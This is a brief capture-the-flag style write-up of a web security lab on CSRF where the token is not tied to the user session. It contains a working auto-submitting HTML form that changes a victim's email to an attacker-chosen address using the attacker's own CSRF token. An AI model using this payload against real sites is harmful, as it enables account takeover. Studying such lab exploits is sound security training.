# Lab: CSRF where token is not tied to user session

The attacker can use his own token to bypass the CSRF protection.

## payload

```html
<form id="mon-formulaire" name="change-email-form" action="https://MYLAB.web-security-academy.net/my-account/change-email" method="POST">
    <input required type="email" name="email" value="wiener@theEvil.com">
    <input required type="hidden" name="csrf" value="QnHOprG0ViCfkxGjHZKV0ipsc7j7yM6A">

</form>

<script>
    let formulaire = document.getElementById("mon-formulaire");
    formulaire.submit();
</script>

```

QnHOprG0ViCfkxGjHZKV0ipsc7j7yM6A is a CSRF token which have not been issued by the current user. (user that i control "wiener") <br>
The application check if this token is present in the pool (pool of token which have not been issued already). <br>
If the token is still present in the pool , the application accept the action to be executed. <br>

